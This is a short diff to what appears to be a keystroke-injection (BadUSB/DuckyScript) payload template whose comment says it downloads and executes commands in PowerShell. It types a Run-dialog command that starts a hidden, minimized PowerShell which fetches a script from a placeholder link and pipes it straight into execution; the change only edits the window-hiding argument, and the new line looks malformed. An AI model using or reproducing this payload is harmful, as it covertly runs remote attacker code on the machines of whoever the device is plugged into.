@@ -2,5 +2,5 @@ REM Downloads and executes commands in powershell
 DELAY {start_delay}
 GUI r
 DELAY 350
-STRING cmd /c start /min powershell -w hidden "irm {link}|iex"
+STRING cmd /c start /min powershell -w 1 hidden "irm {link}|iex"
 {windows_admin}
